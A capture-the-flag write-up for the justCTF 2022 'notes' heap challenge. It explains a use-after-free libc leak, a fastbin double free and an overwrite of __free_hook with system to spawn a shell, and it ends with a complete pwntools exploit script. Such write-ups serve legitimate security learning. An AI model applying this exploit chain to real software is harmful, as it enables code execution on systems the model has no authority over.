## Level: Medium

### Challenge
```
TLDR: use UAF to leak an address in unsorted bin arena, get allacotions on fastbin and perform a fastbin dup attack to overwrite __free_hook pointer with system("/bin/sh")
```

![menu](https://github.com/user-attachments/assets/80649d50-4fe8-4ef2-b583-93bc2d9f9a58)

Challenge menu. 

![notecheck](https://github.com/user-attachments/assets/a9b4becb-f758-4ac1-b05a-4aae3e0b8a43)

Before we begin, there is a check for number of notes which is essentially how many times we can malloc. To get infitine number of allocations send a negative number when asked. 

### Checksec

![checksec](https://github.com/user-attachments/assets/d57bf470-07f8-406d-bad1-40f7bf3e4d62)

### Approach

```
1 - Fill a bin in tcache to get an allocation on unsorted bin
2 - UAF to leak the address in unsorted bin arena
```

We'll do this by allocating 8 chunks in a way that when free'd, 7 of them will go into the same tcache bin and the last one will go into unsorted bin. 

How do we know that we need 7 allocations? From the source code of glibc 2.31:

![7](https://github.com/user-attachments/assets/30db5d21-8b56-40fa-b0c2-0dfb3b1c1d13)

link: https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L323

![unsorted](https://github.com/user-attachments/assets/fb594473-505b-48c9-a7db-30922bac2200)

Now we just need to leak it by simpy using `3. View notes` option with note id of our unsorted bin allocation. (UAF)

```
3 - Get allocations on fastbin by filling tcache sames size count again
4 - Do the double free trick in fastbin to get 2 malloc with same address
```
The reason we're doing this in fastbin instead of tcache is because we don't have a way to corrupt `key`, the double free protection mechanism in tcache. Fastbin doesn't have `key` protection and can be tricked to get a double free. 

```
  # The trick 
  free(a)
  free(b)
  free(a)
```

![sameadr](https://github.com/user-attachments/assets/07d6beb3-88eb-490f-a148-6a5bb6f87511)

```
5 - Empty tcache line by mallocing 7 times (0x60)
6 - Overwrite next pointer with __free_hook
```

![freehok](https://github.com/user-attachments/assets/73efc40b-5b9d-4e9c-9219-c6e9c7e6fa27)

__free_hook pointer is 0 by default but when set, the address that hook is pointing to is being called instead of default GLIBC free functionality. This is used for debugging and tracking. 

With knowing that all we have to do is get that allocation into head of the tcache list so when we malloc we can read into free_hook's pointer and change it to an address in libc.

```
7 - Malloc twice
```

![headoflist](https://github.com/user-attachments/assets/675665c0-b5f1-47b8-a722-68ca42f2f805)

All good.

```
8 - Malloc to start reading into the address that __free_hook points to and overwrite it with "system"
```

![freessyt](https://github.com/user-attachments/assets/1e712020-c651-456a-a623-9c0323b5eb3d)

```
9 - Malloc again to write "/bin/sh" when asked for content (for rdi)
10 - Free the allocation with content "/bin/sh" and enjoy your shell :)
```

![flag](https://github.com/user-attachments/assets/27bd8bc8-7ca4-4dcc-a8c9-bb07dc82c57f)

Thanks to the author for this cool challenge! As always, following sources helped me a lot through this:

nobodyisnobody's write up: https://github.com/nobodyisnobody/write-ups/blob/main/justCTF.2022/pwn/notes/working.exploit.py

double free on fastbin: https://book.hacktricks.xyz/binary-exploitation/libc-heap/double-free

malloc hooks: https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#malloc-hooks

get the challenge from https://github.com/justcatthefish/justctf-2022/tree/main/challenges/pwn_notes

### Full Exploit
```python

from pwn import *

'''
p = gdb.debug("./notes_patched", gdbscript="""
    continue
""")
'''

# set follow-fork-mode child

p = process("./notes_patched")

# unlimited notes
p.recvuntil(b"to use? (0-10): ")
p.sendline(b"-1")

# allocate 9 chunks
for i in range(9):
    p.recvuntil(b">")
    p.sendline("1")
    p.recvuntil(b"size: ")
    p.sendline("130")
    p.recvuntil(b"content: ")
    p.sendline()

# free 8 chunks, so 7 of them will fill the tcache. the last one goes into unsorted bin
for i in range(8):
    p.recvuntil(b">")
    p.sendline("2")
    p.recvuntil(b"note id: ")
    p.sendline(f"{i}")

# leak unsorted main_arena addr
p.recvuntil(b">")
p.sendline("3")
p.recvuntil(b"note id: ")
p.sendline("7")

# calculate offsets
leak = p.recvline().strip()
leak = int.from_bytes(leak, 'little')
print("unsorted bin leak: " + hex(leak))

libc_base = leak - 2018272
print("LIBC_BASE: " + hex(libc_base))

system = libc_base + 336528
print("SYSTEM: " + hex(system))

# FASTBIN DUP attack
# allocate 10 chunks 
for i in range(10):
    p.recvuntil(b">")
    p.sendline("1")
    p.recvuntil(b"size: ")
    p.sendline("60")
    p.recvuntil(b"content: ")
    p.sendline(b"test")


# free 7 chunks to fill tcache
for i in range(8):
    p.recvuntil(b">")
    p.sendline("2")
    p.recvuntil(b"note id: ")
    i = i + 9
    p.sendline(f"{i}")

# get a double free on fastbin
p.recvuntil(b">")
p.sendline("2")
p.recvuntil(b"note id: ")
p.sendline("17")

p.recvuntil(b">")
p.sendline("2")
p.recvuntil(b"note id: ")
p.sendline("18")

p.recvuntil(b">")
p.sendline("2")
p.recvuntil(b"note id: ")
p.sendline("17")

# clear tcache(0x60) list
# get them fastbins to tcache
for i in range(7):
    p.recvuntil(b">")
    p.sendline("1")
    p.recvuntil(b"size: ")
    p.sendline("60")
    p.recvuntil(b"content: ")
    p.sendline()

# overwrite next pointer with __free_hook
free_hook = libc_base + 2027080
print("free_hook: " + hex(free_hook))
payload = p64(free_hook)

p.recvuntil(b">")
p.sendline("1")
p.recvuntil(b"size: ")
p.sendline("60")
p.recvuntil(b"content: ")
p.sendline(payload)

# malloc 2 times to get the allocation head of the list 
payload = b"BBBBBBBB"
p.recvuntil(b">")
p.sendline("1")
p.recvuntil(b"size: ")
p.sendline("60")
p.recvuntil(b"content: ")
p.sendline(payload)


payload = b"CCCCCCCC"
p.recvuntil(b">")
p.sendline("1")
p.recvuntil(b"size: ")
p.sendline("60")
p.recvuntil(b"content: ")
p.sendline(payload)

# overwrite the address __free_hook pointing with system
payload = p64(system)
payload += b"B" * 8

p.recvuntil(b">")
p.sendline("1")
p.recvuntil(b"size: ")
p.sendline("60")
p.recvuntil(b"content: ")
p.sendline(payload)

# malloc again to pass "/bin/sh" 
payload = "/bin/sh"
p.recvuntil(b">")
p.sendline("1")
p.recvuntil(b"size: ")
p.sendline("60")
p.recvuntil(b"content: ")
p.sendline(payload)

# free the allocation with "/bin/sh" to call "system('/bin/sh')"
# enjoy your shell >.>
p.recvuntil(b">")
p.sendline("2")
p.recvuntil(b"note id: ")
p.sendline("30")

p.interactive()

```

<img align='center' src=https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExanVlMGRpYndzcDBxOWtycHFoOHB0bmN0M3IxaWVjN2x1Y3kwbmx6ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/GaePqH1aHE95KI0Vt7/giphy.webp>
